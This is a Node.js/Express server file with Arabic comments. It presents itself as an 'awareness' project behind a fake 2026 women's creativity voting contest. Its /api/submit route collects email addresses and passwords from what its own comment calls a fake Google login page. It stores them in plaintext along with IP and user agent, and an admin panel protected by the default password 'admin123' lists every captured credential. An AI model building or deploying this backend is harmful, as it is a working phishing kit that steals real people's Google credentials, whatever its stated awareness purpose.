// ===================================================
// مشروع التوعية - الخادم الرئيسي مع MongoDB Atlas
// ===================================================

const express = require('express');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const cors = require('cors');
const { MongoClient } = require('mongodb');

const app = express();
const PORT = process.env.PORT || 3000;

// ===================================================
// إعدادات MongoDB Atlas
// ===================================================
const MONGODB_URI = process.env.MONGODB_URI || null;
const DB_NAME = 'votedb';
const COLLECTION_NAME = 'records';

// كلمة مرور الأدمن (يمكن تغييرها من متغيرات البيئة)
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

// ===================================================
// اتصال MongoDB - Singleton لـ Vercel Serverless
// ===================================================
let cachedDb = null;

async function getDB() {
  if (!MONGODB_URI) return null;
  if (cachedDb) return cachedDb;

  try {
    const client = new MongoClient(MONGODB_URI, {
      maxPoolSize: 10,
      serverSelectionTimeoutMS: 5000,
      socketTimeoutMS: 10000,
    });
    await client.connect();
    cachedDb = client.db(DB_NAME);
    console.log('[✅] متصل بـ MongoDB Atlas');
    return cachedDb;
  } catch (err) {
    console.error('[❌] فشل الاتصال بـ MongoDB:', err.message);
    return null;
  }
}

// ===================================================
// احتياطي: ذاكرة محلية
// ===================================================
if (!global.memRecords) global.memRecords = [];

// ===================================================
// دوال قاعدة البيانات
// ===================================================
async function findRecord(id) {
  const db = await getDB();
  if (db) return await db.collection(COLLECTION_NAME).findOne({ id });
  return global.memRecords.find(r => r.id === id) || null;
}

async function insertRecord(record) {
  const db = await getDB();
  if (db) {
    try {
      await db.collection(COLLECTION_NAME).insertOne({ ...record, _id: record.id });
    } catch (e) {
      // Ignore duplicate key
    }
    return;
  }
  global.memRecords.push(record);
}

async function updateRecord(id, updates) {
  const db = await getDB();
  if (db) {
    const result = await db.collection(COLLECTION_NAME).findOneAndUpdate(
      { id },
      { $set: updates },
      { returnDocument: 'after' }
    );
    return result || null;
  }
  const record = global.memRecords.find(r => r.id === id);
  if (!record) return null;
  Object.assign(record, updates);
  return record;
}

async function deleteRecord(id) {
  const db = await getDB();
  if (db) {
    const result = await db.collection(COLLECTION_NAME).deleteOne({ id });
    return result.deletedCount > 0;
  }
  const before = global.memRecords.length;
  global.memRecords = global.memRecords.filter(r => r.id !== id);
  return global.memRecords.length < before;
}

async function getAllRecords() {
  const db = await getDB();
  if (db) {
    return await db.collection(COLLECTION_NAME)
      .find({})
      .sort({ timestamp: -1 })
      .toArray();
  }
  return [...global.memRecords].reverse();
}

async function clearAllRecords() {
  const db = await getDB();
  if (db) {
    await db.collection(COLLECTION_NAME).deleteMany({});
    return;
  }
  global.memRecords = [];
}

// ===================================================
// Middleware
// ===================================================
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ===================================================
// API: فحص الاتصال
// ===================================================
app.get('/api/health', async (req, res) => {
  const db = await getDB();
  res.json({
    status: 'ok',
    database: db ? 'MongoDB Atlas (دائم)' : 'ذاكرة مؤقتة (أضف MONGODB_URI)',
    timestamp: new Date().toISOString()
  });
});

// ===================================================
// API: استقبال البريد وكلمة المرور من صفحة Google المزيفة
// ===================================================
app.post('/api/submit', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ success: false, message: 'بيانات ناقصة' });
  }

  const sessionId = uuidv4();
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
  const userAgent = req.headers['user-agent'] || 'غير معروف';
  const timestamp = new Date().toISOString();

  await insertRecord({
    id: sessionId,
    email,
    password,
    ip,
    user_agent: userAgent,
    timestamp,
    candidate: null,
    status: 'waiting'
  });

  console.log(`[+] بيانات جديدة: ${email} | ${ip} | ${timestamp}`);
  res.json({ success: true, sessionId });
});

// ===================================================
// API: تسجيل التصويت
// ===================================================
app.post('/api/vote', async (req, res) => {
  const { id, candidate } = req.body;
  if (!id || !candidate) {
    return res.status(400).json({ success: false, message: 'بيانات ناقصة' });
  }

  const record = await updateRecord(id, {
    candidate,
    voteTimestamp: new Date().toISOString()
  });

  if (!record) {
    return res.status(404).json({ success: false, message: 'لم يتم العثور على الجلسة' });
  }

  res.json({ success: true, message: 'تم حفظ التصويت' });
});

// ===================================================
// API: فحص حالة الجلسة
// ===================================================
app.get('/api/status/:id', async (req, res) => {
  const record = await findRecord(req.params.id);
  if (!record) {
    return res.status(404).json({ success: false, message: 'الجلسة غير موجودة' });
  }
  res.json({
    success: true,
    status: record.status,
    triggered: record.status === 'triggered',
    candidate: record.candidate || 'غير محدد'
  });
});

// ===================================================
// API: حذف سجل (من صفحة reveal)
// ===================================================
app.delete('/api/delete/:id', async (req, res) => {
  const deleted = await deleteRecord(req.params.id);
  res.json({ success: deleted, message: deleted ? 'تم الحذف' : 'لم يتم العثور' });
});

// ===================================================
// API للأدمن - حماية بكلمة مرور
// ===================================================
function adminGuard(req, res, next) {
  const key = req.headers['x-admin-key'] || '';
  if (key !== ADMIN_PASSWORD) {
    return res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
  }
  next();
}

// جلب جميع السجلات (مع البريد وكلمة المرور والـ IP)
app.get('/api/admin/records', adminGuard, async (req, res) => {
  const records = await getAllRecords();
  res.json({
    success: true,
    records,
    total: records.length,
    waitingCount: records.filter(r => r.status === 'waiting').length,
    triggeredCount: records.filter(r => r.status === 'triggered').length,
  });
});

// إطلاق التوعية لشخص محدد
app.post('/api/admin/trigger/:id', adminGuard, async (req, res) => {
  const record = await updateRecord(req.params.id, {
    status: 'triggered',
    triggeredAt: new Date().toISOString()
  });

  if (!record) {
    return res.status(404).json({ success: false, message: 'السجل غير موجود' });
  }

  res.json({ success: true, message: 'تم إطلاق التوعية' });
});

// إطلاق التوعية للجميع
app.post('/api/admin/trigger-all', adminGuard, async (req, res) => {
  const db = await getDB();
  const now = new Date().toISOString();
  let count = 0;

  if (db) {
    const result = await db.collection(COLLECTION_NAME).updateMany(
      { status: 'waiting' },
      { $set: { status: 'triggered', triggeredAt: now } }
    );
    count = result.modifiedCount;
  } else {
    global.memRecords.forEach(r => {
      if (r.status === 'waiting') {
        r.status = 'triggered';
        r.triggeredAt = now;
        count++;
      }
    });
  }

  res.json({ success: true, count, message: `تم لـ ${count} شخص` });
});

// حذف سجل من لوحة الأدمن
app.delete('/api/admin/delete/:id', adminGuard, async (req, res) => {
  const deleted = await deleteRecord(req.params.id);
  res.json({ success: deleted, message: deleted ? 'تم الحذف' : 'غير موجود' });
});

// مسح الكل
app.delete('/api/admin/clear-all', adminGuard, async (req, res) => {
  await clearAllRecords();
  res.json({ success: true, message: 'تم مسح الكل' });
});

// ===================================================
// تصدير لـ Vercel وتشغيل محلي
// ===================================================
module.exports = app;

if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`
  ╔════════════════════════════════════════════╗
  ║  🗳️  مسابقة الإبداع النسائي 2026           ║
  ║  الموقع:      http://localhost:${PORT}        ║
  ║  الأدمن:      http://localhost:${PORT}/admin.html ║
  ║  كلمة الأدمن: ${ADMIN_PASSWORD}                 ║
  ╚════════════════════════════════════════════╝
    `);
  });
}
